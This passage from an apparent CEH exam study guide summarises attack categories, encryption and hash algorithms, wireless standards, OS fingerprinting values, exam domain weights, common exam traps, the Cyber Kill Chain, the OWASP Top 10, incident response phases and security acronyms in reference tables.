| Karma Attack | MITM | Responds to probe requests from any SSID | WiFi Pineapple | 802.11 |
| Jamming | DoS | Overwhelms RF spectrum to disrupt wireless communication | RF jammer | 802.11 |
| Bluesnarfing | Bluetooth | Unauthorized access to Bluetooth device data | Bluesnarfer | Bluetooth |
| Bluejacking | Bluetooth | Sending unsolicited messages via Bluetooth | Custom | Bluetooth |
| Bluebugging | Bluetooth | Taking full control of Bluetooth device | Custom | Bluetooth |

### 4.5 Social Engineering Attacks

| Attack | Category | Description | Key Tool |
|--------|----------|-------------|----------|
| Phishing | Email | Mass fraudulent emails impersonating trusted entities | SET, GoPhish |
| Spear Phishing | Email | Targeted phishing at specific individuals/organizations | SET |
| Whaling | Email | Phishing targeting C-level executives | SET |
| Vishing | Phone | Voice phishing via phone calls | Caller ID spoofing |
| Smishing | SMS | Phishing via SMS text messages | SMS spoofing tools |
| Pharming | DNS | Redirects users to fake websites via DNS manipulation | DNS poisoning |
| Watering Hole | Web | Compromises websites frequently visited by targets | Exploit kits |
| Baiting | Physical | Leaves infected USB drives or media for victims to find | USB Rubber Ducky |
| Pretexting | Social | Creating fabricated scenario to extract information | Phone/Email |
| Quid Pro Quo | Social | Offering something in exchange for information | Phone/Email |
| Tailgating | Physical | Following authorized person through secured door | Physical access |
| Piggybacking | Physical | Like tailgating but with the person's knowledge/consent | Physical access |
| Diversion Theft | Physical | Diverting deliveries or shipments to wrong address | Social engineering |

---

## 5. ENCRYPTION ALGORITHMS REFERENCE

### 5.1 Symmetric Encryption (Shared Key)

| Algorithm | Key Size (bits) | Block Size (bits) | Rounds | Type | Notes |
|-----------|----------------|-------------------|--------|------|-------|
| **DES** | 56 | 64 | 16 | Block | Deprecated; Feistel cipher; broken |
| **3DES (Triple DES)** | 112 or 168 | 64 | 48 (3x16) | Block | EDE mode (Encrypt-Decrypt-Encrypt); slow; being phased out |
| **AES-128** | 128 | 128 | 10 | Block | Rijndael algorithm; current standard; fast |
| **AES-192** | 192 | 128 | 12 | Block | NIST standard; used in government |
| **AES-256** | 256 | 128 | 14 | Block | Strongest AES; military/top-secret grade |
| **Blowfish** | 32-448 | 64 | 16 | Block | Feistel cipher; fast; replaced by Twofish |
| **Twofish** | 128/192/256 | 128 | 16 | Block | AES finalist; Feistel-related structure |
| **CAST-128** | 40-128 | 64 | 12 or 16 | Block | Used in PGP; Feistel cipher |
| **RC4** | 40-2048 | Stream | N/A | Stream | Used in WEP, old SSL; broken; avoid |
| **RC5** | 0-2040 | 32/64/128 | 1-255 | Block | Variable parameters; designed by Rivest |
| **RC6** | 128/192/256 | 128 | 20 | Block | AES finalist; based on RC5 |
| **IDEA** | 128 | 64 | 8.5 | Block | Used in PGP; patented (expired) |
| **Serpent** | 128/192/256 | 128 | 32 | Block | AES finalist; very conservative design |
| **ChaCha20** | 256 | Stream | 20 | Stream | Modern stream cipher; used in TLS 1.3 |

### 5.2 Asymmetric Encryption (Public/Private Key)

| Algorithm | Type | Key Size (bits) | Use Case | Notes |
|-----------|------|----------------|----------|-------|
| **RSA** | Encryption + Signatures | 1024-4096 | Key exchange, digital signatures, encryption | Based on factoring large primes; most widely used |
| **Diffie-Hellman (DH)** | Key Exchange | 1024-4096 | Secure key exchange over insecure channel | Does NOT encrypt; only establishes shared secret |
| **ECC** | Encryption + Signatures | 160-521 | Mobile, IoT, modern TLS | Shorter keys, same security as RSA; elliptic curve math |
| **DSA** | Signatures only | 1024-3072 | Digital signatures | Cannot encrypt; NIST standard; used in DSS |
| **ElGamal** | Encryption + Signatures | 1024+ | Encryption, signatures | Based on DH; used in PGP |

### 5.3 Block Cipher Modes of Operation

| Mode | Name | Description | IV Required |
|------|------|-------------|-------------|
| **ECB** | Electronic Codebook | Each block encrypted independently; patterns visible | No |
| **CBC** | Cipher Block Chaining | Each block XORed with previous ciphertext block | Yes |
| **CFB** | Cipher Feedback | Converts block cipher to stream cipher | Yes |
| **OFB** | Output Feedback | Like CFB but feedback from output not ciphertext | Yes |
| **CTR** | Counter | Uses counter value; parallelizable; fast | Nonce |
| **GCM** | Galois/Counter Mode | CTR + authentication; used in TLS 1.3 | Nonce |

---

## 6. HASH FUNCTIONS REFERENCE

| Hash | Output Size (bits) | Output (hex chars) | Status | Notes |
|------|-------------------|---------------------|--------|-------|
| **MD5** | 128 | 32 | Broken | Collision attacks found; do not use for security |
| **SHA-1** | 160 | 40 | Deprecated | Collision attacks demonstrated (SHAttered); avoid |
| **SHA-256** | 256 | 64 | Secure | SHA-2 family; widely used; Bitcoin proof-of-work |
| **SHA-384** | 384 | 96 | Secure | SHA-2 family; truncated SHA-512 |
| **SHA-512** | 512 | 128 | Secure | SHA-2 family; 64-bit operations |
| **SHA-3** | 224/256/384/512 | Variable | Secure | Keccak algorithm; different design from SHA-2 |
| **HMAC** | Variable | Variable | Secure | Hash-based Message Authentication Code; combines hash with secret key |
| **RIPEMD-160** | 160 | 40 | Mostly Secure | Used in Bitcoin address generation |
| **NTLM** | 128 | 32 | Weak | Windows password hash; MD4-based; no salting |
| **LM Hash** | 128 | 32 | Broken | Legacy Windows; splits password into 7-char halves; case-insensitive |
| **bcrypt** | 184 | N/A | Secure | Adaptive; built-in salt; used for password storage |

### Key Hash Concepts for CEH Exam

- **Salt**: Random value added to password before hashing (prevents rainbow table attacks)
- **Key Stretching**: Applying hash function multiple times (bcrypt, PBKDF2, scrypt)
- **Collision**: Two different inputs produce same hash output
- **Birthday Attack**: Finds collisions using birthday paradox; needs 2^(n/2) attempts for n-bit hash
- **MD5 Birthday Attack**: 2^64 attempts (not 2^128)
- **SHA-1 Birthday Attack**: 2^80 attempts (not 2^160)
- **Length Extension Attack**: Append data to hash without knowing original message (affects MD5, SHA-1, SHA-256)

---

## 7. WIRELESS STANDARDS TABLE

| Standard | Frequency | Max Speed | Range (Indoor) | Modulation | Encryption | Year |
|----------|-----------|-----------|----------------|------------|------------|------|
| **802.11a** | 5 GHz | 54 Mbps | ~35m | OFDM | WEP | 1999 |
| **802.11b** | 2.4 GHz | 11 Mbps | ~38m | DSSS | WEP | 1999 |
| **802.11g** | 2.4 GHz | 54 Mbps | ~38m | OFDM | WEP/WPA | 2003 |
| **802.11n (Wi-Fi 4)** | 2.4/5 GHz | 600 Mbps | ~70m | OFDM/MIMO | WPA2 | 2009 |
| **802.11ac (Wi-Fi 5)** | 5 GHz | 6.93 Gbps | ~35m | OFDM/MU-MIMO | WPA2 | 2013 |
| **802.11ax (Wi-Fi 6)** | 2.4/5/6 GHz | 9.6 Gbps | ~30m | OFDMA/MU-MIMO | WPA3 | 2020 |

### Wireless Encryption Comparison

| Protocol | Encryption | Key Size | IV Size | Authentication | Status |
|----------|------------|----------|---------|----------------|--------|
| **WEP** | RC4 | 40/104 bits | 24-bit IV | Shared Key / Open | Broken; crackable in minutes |
| **WPA** | TKIP (RC4) | 128 bits | 48-bit IV | PSK or 802.1X | Deprecated; TKIP has weaknesses |
| **WPA2** | AES-CCMP | 128 bits | 48-bit IV | PSK or 802.1X | Current standard; KRACK vulnerability |
| **WPA3** | AES-GCMP-256 | 192/256 bits | 48-bit IV | SAE (Dragonfly) | Latest; forward secrecy; resistant to offline dictionary |

### Key Wireless Concepts

- **WEP weakness**: Short 24-bit IV leads to IV reuse; statistical attack after collecting ~40,000-85,000 IVs
- **WPA TKIP**: Per-packet key mixing; message integrity check (MIC/Michael); still uses RC4
- **WPA2 4-Way Handshake**: ANonce, SNonce, MIC; derives PTK (Pairwise Transient Key) from PMK
- **WPA3 SAE**: Simultaneous Authentication of Equals; Dragonfly handshake; prevents offline dictionary attacks
- **802.1X/EAP**: Enterprise authentication using RADIUS server; EAP-TLS, PEAP, EAP-TTLS

---

## 8. OS FINGERPRINTING QUICK REFERENCE

### 8.1 TTL (Time to Live) Values

| Operating System | Default TTL |
|-----------------|-------------|
| **Linux** | 64 |
| **Windows** | 128 |
| **macOS / iOS** | 64 |
| **Cisco / Network devices** | 255 |
| **Solaris / AIX** | 254 |
| **FreeBSD** | 64 |
| **OpenBSD** | 255 |

**Exam Tip**: If you see TTL=128 in a packet capture, it is a Windows system. TTL=64 suggests Linux/macOS. TTL=255 suggests a network device (Cisco) or Solaris/OpenBSD.

### 8.2 TCP Window Size

| Operating System | Typical Window Size |
|-----------------|-------------------|
| **Linux (2.4/2.6)** | 5840 |
| **Linux (3.x+)** | 14600 or 29200 |
| **Windows XP** | 65535 |
| **Windows 7/8/10** | 8192 (or multiple thereof) |
| **Windows Server** | 8192 |
| **Cisco IOS** | 4128 |
| **FreeBSD** | 65535 |
| **OpenBSD** | 16384 |

### 8.3 Other OS Fingerprinting Fields

| Field | What It Reveals |
|-------|----------------|
| **IP ID** | Sequential (Windows), random (Linux), zero (some BSD) |
| **Don't Fragment (DF)** | Usually set on Linux/Windows; not set on some older OS |
| **TCP Options** | Order and values of MSS, Window Scale, SACK, Timestamp differ by OS |
| **Initial Sequence Number** | Pattern/randomness varies by OS TCP stack |

### 8.4 Fingerprinting Methods

| Method | Type | Description |
|--------|------|-------------|
| **Nmap -O** | Active | Sends crafted packets and analyzes responses |
| **p0f** | Passive | Analyzes traffic passively without sending packets |
| **Xprobe2** | Active | OS fingerprinting using ICMP |
| **Banner Grabbing** | Active | Connects to service and reads version banner |

---

## 9. CEH EXAM DOMAIN WEIGHTS

### CEH v12 Exam Blueprint (125 questions, 4 hours)

| Domain | Title | Weight | Questions (approx) |
|--------|-------|--------|---------------------|
| 1 | Information Security and Ethical Hacking Overview | 6% | ~8 |
| 2 | Reconnaissance Techniques | 21% | ~26 |
| 3 | System Hacking Phases and Attack Techniques | 17% | ~21 |
| 4 | Network and Perimeter Hacking | 14% | ~18 |
| 5 | Web Application Hacking | 16% | ~20 |
| 6 | Wireless Network Hacking | 6% | ~8 |
| 7 | Mobile Platform, IoT, and OT Hacking | 5% | ~6 |
| 8 | Cloud Computing | 6% | ~8 |
| 9 | Cryptography | 9% | ~11 |

### Domain Sub-Topics

**Domain 1 (6%) - Information Security Overview**
- Information security elements (CIA triad, AAA)
- Cyber kill chain, MITRE ATT&CK, Diamond Model
- Hacking phases, hacker types, ethical hacking concepts
- Information security laws and regulations

**Domain 2 (21%) - Reconnaissance (HIGHEST WEIGHT)**
- Footprinting concepts, Google hacking, OSINT
- DNS footprinting, network footprinting, email footprinting
- Social engineering techniques
- Scanning methodology, host/port/service discovery
- Enumeration (NetBIOS, SNMP, LDAP, NTP, DNS, SMTP)

**Domain 3 (17%) - System Hacking**
- Password cracking (online vs offline, types of attacks)
- Privilege escalation techniques
- Maintaining access (backdoors, rootkits, RATs)
- Covering tracks (clearing logs, modifying timestamps)
- Steganography

**Domain 4 (14%) - Network/Perimeter Hacking**
- Sniffing concepts and techniques (active vs passive)
- ARP poisoning, MITM attacks, MAC flooding
- DoS/DDoS attack concepts and techniques
- Session hijacking (network-level and application-level)
- IDS/IPS/Firewall evasion techniques
- Honeypot concepts

**Domain 5 (16%) - Web Application Hacking**
- OWASP Top 10
- SQL injection (types, methodology, countermeasures)
- XSS (stored, reflected, DOM-based)
- CSRF, SSRF, parameter tampering
- Web server attacks, directory traversal
- API attacks

**Domain 6 (6%) - Wireless Hacking**
- Wireless standards, encryption protocols
- Wireless attack methodology
- WEP/WPA/WPA2/WPA3 cracking
- Bluetooth attacks

**Domain 7 (5%) - Mobile/IoT/OT**
- Android/iOS attack vectors
- Mobile device management (MDM)
- IoT architecture, protocols, attacks
- OT/SCADA/ICS concepts and attacks

**Domain 8 (6%) - Cloud Computing**
- Cloud deployment/service models (IaaS, PaaS, SaaS)
- Cloud threats (data breach, insecure APIs, account hijacking)
- Container security (Docker, Kubernetes)
- Serverless computing risks

**Domain 9 (9%) - Cryptography**
- Symmetric vs asymmetric encryption
- Hash functions, digital signatures
- PKI, certificates, certificate authorities
- Cryptanalysis techniques
- Disk encryption, email encryption

---

## 10. COMMON EXAM TRAPS (50+ Traps)

### Domain 1 - General Concepts

1. **TRAP**: Thinking Confidentiality, Integrity, Availability are listed in order of importance → **CORRECT**: All three are equally important; priority depends on the organization's needs

2. **TRAP**: Confusing vulnerability with threat → **CORRECT**: Vulnerability = weakness in system; Threat = potential danger that exploits vulnerability; Risk = likelihood x impact

3. **TRAP**: Thinking ethical hackers need no permission → **CORRECT**: Ethical hackers MUST have written authorization (Rules of Engagement / scope document) BEFORE testing

4. **TRAP**: Confusing black box, white box, gray box testing → **CORRECT**: Black = no knowledge; White = full knowledge (source code, network diagrams); Gray = partial knowledge

5. **TRAP**: Confusing non-repudiation with authentication → **CORRECT**: Authentication proves identity; Non-repudiation proves an action occurred and the sender cannot deny it (digital signatures)

### Domain 2 - Reconnaissance & Scanning

6. **TRAP**: Thinking active recon includes Google dorking → **CORRECT**: Google dorking/OSINT is PASSIVE recon (you don't touch the target); active recon involves direct interaction

7. **TRAP**: Confusing TCP SYN scan with TCP Connect scan → **CORRECT**: SYN (-sS) = half-open, does NOT complete handshake, stealthier; Connect (-sT) = completes full 3-way handshake

8. **TRAP**: Thinking NULL/FIN/Xmas scans work on Windows → **CORRECT**: These scans rely on RFC 793 compliance; Windows sends RST for ALL probes regardless, making them INEFFECTIVE against Windows

9. **TRAP**: Confusing the Idle/Zombie scan flag → **CORRECT**: Idle scan is `-sI` (capital I), NOT `-si`; requires a zombie host with predictable IP ID sequence

10. **TRAP**: Thinking Nmap -sA determines open ports → **CORRECT**: ACK scan only maps FIREWALL RULES (filtered vs unfiltered); it CANNOT determine if a port is open or closed

11. **TRAP**: Confusing AXFR with IXFR → **CORRECT**: AXFR = full zone transfer; IXFR = incremental zone transfer; both use TCP port 53

12. **TRAP**: Thinking Shodan is an active scanning tool → **CORRECT**: Shodan is a SEARCH ENGINE of previously scanned devices; using Shodan is passive recon

13. **TRAP**: Confusing banner grabbing with OS fingerprinting → **CORRECT**: Banner grabbing identifies service VERSION; OS fingerprinting identifies the OPERATING SYSTEM (via TTL, window size, etc.)

14. **TRAP**: SNMP community string "public" gives write access → **CORRECT**: "public" = read-only (default); "private" = read-write (default)

### Domain 3 - System Hacking

15. **TRAP**: Thinking rainbow table attacks work on salted hashes → **CORRECT**: Rainbow tables are pre-computed for unsalted hashes; salting defeats rainbow tables

16. **TRAP**: Confusing horizontal and vertical privilege escalation → **CORRECT**: Vertical = low user to admin/root (escalation UP); Horizontal = access another user's account at SAME level

17. **TRAP**: Thinking Mimikatz cracks passwords → **CORRECT**: Mimikatz EXTRACTS plaintext passwords from LSASS memory; it does NOT crack hashes

18. **TRAP**: Confusing rootkits and backdoors → **CORRECT**: Rootkit = hides malware presence (stealth); Backdoor = provides persistent unauthorized access

19. **TRAP**: Thinking all rootkits operate at kernel level → **CORRECT**: Rootkits can be user-mode (application), kernel-mode, boot-level, or hypervisor-level

20. **TRAP**: Confusing steganography with cryptography → **CORRECT**: Steganography HIDES the existence of a message; Cryptography scrambles the message but existence is known

21. **TRAP**: Thinking clearing event logs fully covers tracks → **CORRECT**: Other artifacts remain: shell history, recent files, prefetch, registry, temp files, memory

### Domain 4 - Network/Perimeter

22. **TRAP**: Thinking passive sniffing works on switched networks → **CORRECT**: Passive sniffing only works on HUBS or your own traffic; switched networks require ARP poisoning or port mirroring for MITM

23. **TRAP**: Confusing Smurf and Fraggle attacks → **CORRECT**: Smurf uses ICMP echo; Fraggle uses UDP echo (port 7). Both send to broadcast with spoofed source

24. **TRAP**: Thinking HTTPS prevents session hijacking → **CORRECT**: HTTPS encrypts data in transit but stolen SESSION COOKIES can still be used if obtained (e.g., XSS, MITM before SSL)

25. **TRAP**: Confusing IDS and IPS → **CORRECT**: IDS = DETECTS and ALERTS (passive); IPS = DETECTS and BLOCKS/PREVENTS (inline, active)

26. **TRAP**: Confusing signature-based and anomaly-based detection → **CORRECT**: Signature = matches known patterns (cannot detect zero-day); Anomaly = detects deviations from baseline (CAN detect zero-day but more false positives)

27. **TRAP**: Thinking honeypots are illegal → **CORRECT**: Honeypots are LEGAL defensive tools; they are enticing but no legal issues with deploying them on your own network

28. **TRAP**: Confusing network-level and application-level session hijacking → **CORRECT**: Network-level = TCP sequence prediction, MITM; Application-level = stealing cookies, session tokens

29. **TRAP**: Thinking MAC flooding affects routers → **CORRECT**: MAC flooding targets SWITCHES (overflows CAM/MAC address table), NOT routers

30. **TRAP**: Confusing stateful and stateless firewalls → **CORRECT**: Stateless = filters individual packets by rules (ACLs); Stateful = tracks connection STATE and context

### Domain 5 - Web Application

31. **TRAP**: Confusing Stored and Reflected XSS → **CORRECT**: Stored = script saved on server (persistent, more dangerous); Reflected = script in URL/request reflected back (non-persistent)

32. **TRAP**: Thinking parameterized queries prevent all injection → **CORRECT**: Parameterized queries prevent SQL injection; they do NOT prevent other injections (LDAP, XML, command injection)

33. **TRAP**: Confusing SQL injection UNION-based with blind → **CORRECT**: UNION-based = data returned in response; Blind = no data returned, must infer via true/false or time delays

34. **TRAP**: Confusing authentication and authorization → **CORRECT**: Authentication = WHO you are (login); Authorization = WHAT you can do (permissions/access control)

35. **TRAP**: Thinking WAF replaces secure coding → **CORRECT**: WAF is defense-in-depth but does NOT replace secure coding practices; WAFs can be bypassed

36. **TRAP**: Confusing CSRF with XSS → **CORRECT**: XSS = injects script to execute in victim's browser; CSRF = forces victim's browser to make authenticated requests to target site

37. **TRAP**: Thinking input validation on client-side is sufficient → **CORRECT**: Client-side validation can be BYPASSED; server-side validation is MANDATORY

38. **TRAP**: Confusing directory traversal with LFI → **CORRECT**: Directory traversal = reads files using ../ paths; LFI = includes/executes files through application parameter (can lead to RCE)

### Domain 6 - Wireless

39. **TRAP**: Thinking WPA2-PSK is uncrackable → **CORRECT**: WPA2-PSK can be cracked by capturing 4-way handshake and brute-forcing/dictionary attacking the PSK offline

40. **TRAP**: Confusing WEP cracking with WPA cracking → **CORRECT**: WEP = statistical attack on weak IVs (fast); WPA/WPA2 = capture handshake then offline dictionary/brute-force (depends on password strength)

41. **TRAP**: Thinking WPA3 is completely immune to attacks → **CORRECT**: WPA3 has had Dragonblood vulnerabilities; SAE is more secure but not invulnerable

42. **TRAP**: Confusing Bluesnarfing with Bluejacking → **CORRECT**: Bluejacking = SENDING unsolicited messages (harmless); Bluesnarfing = STEALING data (unauthorized access to contacts, calendar, etc.)

43. **TRAP**: Thinking hidden SSID provides security → **CORRECT**: Hidden SSID is trivially discovered via passive sniffing of probe requests; it is NOT a security measure

### Domain 7 - Mobile/IoT/OT

44. **TRAP**: Thinking jailbreaking and rooting are the same → **CORRECT**: Jailbreaking = iOS (bypasses Apple restrictions); Rooting = Android (gains root/superuser access)

45. **TRAP**: Confusing SCADA and ICS → **CORRECT**: SCADA = Supervisory Control and Data Acquisition (software/system); ICS = Industrial Control System (broader term encompassing SCADA, DCS, PLCs)

46. **TRAP**: Thinking Modbus has built-in authentication → **CORRECT**: Modbus has NO authentication or encryption by default; it is inherently insecure

47. **TRAP**: Confusing IoT communication protocols → **CORRECT**: MQTT = lightweight pub/sub messaging; CoAP = constrained RESTful protocol; Zigbee = mesh networking; Z-Wave = home automation

### Domain 8 - Cloud

48. **TRAP**: Confusing IaaS, PaaS, SaaS responsibility models → **CORRECT**: IaaS = customer manages OS and up; PaaS = customer manages apps and data only; SaaS = provider manages everything

49. **TRAP**: Thinking cloud is inherently less secure → **CORRECT**: Cloud security depends on SHARED RESPONSIBILITY; cloud providers handle infrastructure security; customers handle data/access security

50. **TRAP**: Confusing cloud deployment models → **CORRECT**: Public = shared infrastructure (AWS, Azure); Private = dedicated single org; Hybrid = mix of public and private; Community = shared by specific group

51. **TRAP**: Thinking containers are fully isolated VMs → **CORRECT**: Containers share the HOST KERNEL (less isolation than VMs); container escape attacks are possible

### Domain 9 - Cryptography

52. **TRAP**: Confusing symmetric and asymmetric key counts → **CORRECT**: Symmetric: n(n-1)/2 keys for n users; Asymmetric: 2n keys for n users (each gets public + private)

53. **TRAP**: Thinking DH provides encryption → **CORRECT**: Diffie-Hellman provides KEY EXCHANGE only; it does NOT encrypt data

54. **TRAP**: Confusing encryption with hashing → **CORRECT**: Encryption = REVERSIBLE (with key); Hashing = ONE-WAY (irreversible); hashing is NOT encryption

55. **TRAP**: Thinking digital signatures encrypt the entire message → **CORRECT**: Digital signatures encrypt the HASH of the message with sender's PRIVATE key; the message itself may not be encrypted

56. **TRAP**: Confusing which key encrypts/decrypts in asymmetric → **CORRECT**: For CONFIDENTIALITY: encrypt with recipient's PUBLIC key; For SIGNATURES: sign with sender's PRIVATE key

57. **TRAP**: Thinking ECB mode is secure → **CORRECT**: ECB encrypts each block independently; identical plaintext blocks produce identical ciphertext blocks (patterns visible); NEVER use ECB

58. **TRAP**: Confusing PKI components → **CORRECT**: CA = issues certificates; RA = verifies identity before CA issues cert; CRL = list of revoked certificates; OCSP = real-time cert status checking

---

## 11. CYBER KILL CHAIN (Lockheed Martin - 7 Phases)

| Phase | Name | Description | Attacker Activities | Defender Actions |
|-------|------|-------------|---------------------|-----------------|
| 1 | **Reconnaissance** | Research and identify targets | OSINT, social media, Google dorking, DNS queries, Shodan, port scanning | Web analytics, OSINT monitoring, honeytokens |
| 2 | **Weaponization** | Create deliverable payload (exploit + backdoor) | Create malicious PDF/Office doc, build exploit, couple payload with exploit | YARA rules, malware analysis, threat intelligence |
| 3 | **Delivery** | Transmit weapon to target | Phishing email, USB drop, watering hole, direct exploit | Email filtering, web proxy, user awareness training |
| 4 | **Exploitation** | Trigger the exploit on target system | Execute code via vulnerability, user opens malicious file, zero-day exploit | Patching, DEP, ASLR, application whitelisting |
| 5 | **Installation** | Install backdoor/malware on target | Install RAT, rootkit, web shell; create persistence mechanisms | HIDS, endpoint protection, file integrity monitoring |
| 6 | **Command & Control (C2)** | Establish communication channel back to attacker | C2 over HTTP/HTTPS/DNS, social media, custom protocols | Network monitoring, DNS sinkholing, block known C2 IPs |
| 7 | **Actions on Objectives** | Accomplish the mission goal | Data exfiltration, data destruction, lateral movement, ransomware | DLP, network segmentation, incident response |

### Related Frameworks

- **MITRE ATT&CK**: Tactics, Techniques, and Procedures (TTPs) knowledge base; more granular than Kill Chain
- **Diamond Model**: Adversary, Capability, Infrastructure, Victim; focuses on relationships
- **Unified Kill Chain**: 18 phases combining Kill Chain with MITRE ATT&CK

---

## 12. OWASP TOP 10 (2021)

| Rank | Category | Description | Example Attack | Key Mitigation |
|------|----------|-------------|----------------|----------------|
| A01 | **Broken Access Control** | Restrictions on authenticated users not properly enforced | IDOR, privilege escalation, forced browsing, CORS misconfiguration | Deny by default, server-side access control, disable directory listing |
| A02 | **Cryptographic Failures** | Failures related to cryptography (formerly "Sensitive Data Exposure") | Cleartext transmission, weak algorithms, missing encryption, exposed keys | Use TLS everywhere, strong algorithms (AES-256), proper key management |
| A03 | **Injection** | Untrusted data sent to interpreter as part of command/query | SQL injection, NoSQL injection, LDAP injection, OS command injection | Parameterized queries, input validation, ORM, WAF |
| A04 | **Insecure Design** | Missing or ineffective security controls by design | Business logic flaws, missing rate limiting, insufficient threat modeling | Threat modeling, secure design patterns, reference architectures |
| A05 | **Security Misconfiguration** | Insecure default configs, incomplete setup, open storage | Default credentials, unnecessary features enabled, verbose errors, missing patches | Hardening, automated config checks, remove defaults, minimal install |
| A06 | **Vulnerable and Outdated Components** | Using components with known vulnerabilities | Using old jQuery, Apache Struts, Log4j without patches | Patch management, SCA tools, monitor CVE databases, remove unused components |
| A07 | **Identification and Authentication Failures** | Weaknesses in authentication/session management | Credential stuffing, weak passwords, session fixation, missing MFA | MFA, strong password policies, rate limiting, secure session management |
| A08 | **Software and Data Integrity Failures** | Code/infrastructure without integrity verification | CI/CD pipeline attacks, insecure deserialization, unsigned updates | Code signing, integrity checks, SRI for CDN resources, signed updates |
| A09 | **Security Logging and Monitoring Failures** | Insufficient logging, detection, and response | Attacks go undetected, no audit trail, logs not monitored | Centralized logging (SIEM), alert on suspicious activity, log integrity |
| A10 | **Server-Side Request Forgery (SSRF)** | App fetches remote resource without validating user-supplied URL | Access internal services, cloud metadata endpoint, port scanning | Validate/sanitize input URLs, allowlist, network segmentation, disable redirects |

---

## 13. INCIDENT RESPONSE PHASES

### 13.1 NIST SP 800-61 (4 Phases)

| Phase | Activities |
|-------|-----------|
| 1. **Preparation** | Develop IR plan, train team, acquire tools, establish communication channels, build jump bag |
| 2. **Detection and Analysis** | Monitor alerts (IDS/SIEM), analyze indicators of compromise (IoCs), determine scope, document findings, prioritize incident |
| 3. **Containment, Eradication, and Recovery** | **Short-term containment**: isolate affected systems; **Long-term containment**: patch, harden; **Eradication**: remove malware, close attack vector; **Recovery**: restore from backups, monitor for recurrence |
| 4. **Post-Incident Activity** | Lessons learned meeting, update IR plan, document timeline, retain evidence, report to stakeholders |

### 13.2 SANS 6-Phase Model (PICERL)

| Phase | Name | Activities |
|-------|------|-----------|
| 1 | **Preparation** | Policies, tools, training, IR team (CSIRT), communication plan |
| 2 | **Identification** | Detect incident, determine if event is actually an incident, document IoCs |
| 3 | **Containment** | Short-term (isolate) and long-term (temporary fix); forensic imaging BEFORE containment if possible |
| 4 | **Eradication** | Remove malware, patch vulnerabilities, remove attacker access, identify root cause |
| 5 | **Recovery** | Restore systems, verify functionality, monitor for re-infection |
| 6 | **Lessons Learned** | Post-mortem report, update procedures, identify improvements |

### Key IR Concepts for CEH Exam

- **Order of Volatility** (most volatile first): CPU registers/cache > RAM > swap/page file > disk > remote logs > physical media
- **Chain of Custody**: Documents who handled evidence, when, where, and what was done
- **First Responder**: Isolate scene, document everything, do NOT power off (preserve volatile evidence)
- **Forensic Image**: Bit-for-bit copy (dd, FTK Imager); always work on COPY, never original
- **Write Blocker**: Hardware/software that prevents writing to evidence drive
- **Evidence Integrity**: Hash original and copy (MD5/SHA-256); hashes must match

---

## 14. KEY ACRONYMS GLOSSARY

| Acronym | Full Name | Description |
|---------|-----------|-------------|
| **AAA** | Authentication, Authorization, Accounting | Security framework for controlling access |
| **ACL** | Access Control List | Rules defining who can access what resources |
| **AES** | Advanced Encryption Standard | Symmetric block cipher; current encryption standard |
| **APT** | Advanced Persistent Threat | Sophisticated, long-term targeted attack (nation-state) |
| **ARP** | Address Resolution Protocol | Maps IP addresses to MAC addresses |
| **BCP** | Business Continuity Plan | Plan to maintain business operations during/after disaster |
| **BYOD** | Bring Your Own Device | Policy allowing personal devices on corporate network |
| **CA** | Certificate Authority | Issues and manages digital certificates |
| **CASB** | Cloud Access Security Broker | Security policy enforcement between cloud users and providers |
| **CIA** | Confidentiality, Integrity, Availability | Three pillars of information security |
| **CISO** | Chief Information Security Officer | Executive responsible for organization's information security |
| **CRL** | Certificate Revocation List | List of revoked digital certificates |
| **CSIRT** | Computer Security Incident Response Team | Team that handles security incidents |
| **CVE** | Common Vulnerabilities and Exposures | Standardized vulnerability identifiers |
| **CVSS** | Common Vulnerability Scoring System | Standard for rating vulnerability severity (0-10) |
| **DAC** | Discretionary Access Control | Owner determines access permissions |
| **DDoS** | Distributed Denial of Service | DoS attack from multiple sources |
| **DEP** | Data Execution Prevention | Prevents code execution from non-executable memory |
| **DLP** | Data Loss Prevention | Prevents unauthorized data transfer/exfiltration |
| **DMARC** | Domain-based Message Authentication, Reporting & Conformance | Email authentication combining SPF + DKIM |
| **DKIM** | DomainKeys Identified Mail | Email authentication using digital signatures |
| **DMZ** | Demilitarized Zone | Network segment between internal and external networks |
| **DNS** | Domain Name System | Translates domain names to IP addresses |
| **DRP** | Disaster Recovery Plan | Plan to recover IT systems after disaster |
| **EAP** | Extensible Authentication Protocol | Authentication framework used in wireless and PPP |
| **EDR** | Endpoint Detection and Response | Endpoint security with detection and investigation |
| **FIM** | File Integrity Monitoring | Detects unauthorized changes to files |
| **GPO** | Group Policy Object | Windows AD mechanism for managing configurations |
| **HIDS** | Host-based Intrusion Detection System | IDS running on individual host |
| **HIPS** | Host-based Intrusion Prevention System | IPS running on individual host |
| **HSM** | Hardware Security Module | Physical device for key management and crypto |
| **IAM** | Identity and Access Management | Framework for managing digital identities |
| **IoC** | Indicator of Compromise | Artifact indicating potential intrusion |
| **IPS** | Intrusion Prevention System | Detects AND blocks malicious activity |
| **MAC** | Mandatory Access Control | System-enforced access based on security labels |
| **MDM** | Mobile Device Management | Software for managing mobile devices |
| **MFA** | Multi-Factor Authentication | Requires two or more authentication factors |
| **MITM** | Man-in-the-Middle | Attacker intercepts communication between two parties |
| **NAC** | Network Access Control | Controls device access to network |
| **NIDS** | Network-based Intrusion Detection System | IDS monitoring network traffic |
| **NVD** | National Vulnerability Database | US government vulnerability database |
| **OCSP** | Online Certificate Status Protocol | Real-time certificate validation |
| **OWASP** | Open Web Application Security Project | Web app security community and standards |
| **PAM** | Privileged Access Management | Managing and securing privileged accounts |
| **PII** | Personally Identifiable Information | Data that can identify an individual |
| **PKI** | Public Key Infrastructure | Framework for managing digital certificates and keys |
| **RBAC** | Role-Based Access Control | Access based on user's role in organization |
| **RTO** | Recovery Time Objective | Maximum acceptable downtime after disaster |
| **RPO** | Recovery Point Objective | Maximum acceptable data loss (time-based) |
| **SIEM** | Security Information and Event Management | Centralized log collection, correlation, and alerting |
| **SOAR** | Security Orchestration, Automation, and Response | Automates security operations and incident response |
| **SOC** | Security Operations Center | Centralized security monitoring facility |
| **SPF** | Sender Policy Framework | Email authentication via DNS TXT records |
| **STIX** | Structured Threat Information Expression | Language for sharing threat intelligence |
| **TAXII** | Trusted Automated Exchange of Intelligence Information | Protocol for exchanging STIX data |
| **TTP** | Tactics, Techniques, and Procedures | Describes adversary behavior patterns |
| **UEBA** | User and Entity Behavior Analytics | Detects anomalous user/entity behavior |
| **VPN** | Virtual Private Network | Encrypted tunnel over public network |
| **WAF** | Web Application Firewall | Filters and monitors HTTP traffic to web app |
| **XDR** | Extended Detection and Response | Cross-layer detection and response (endpoint, network, cloud) |
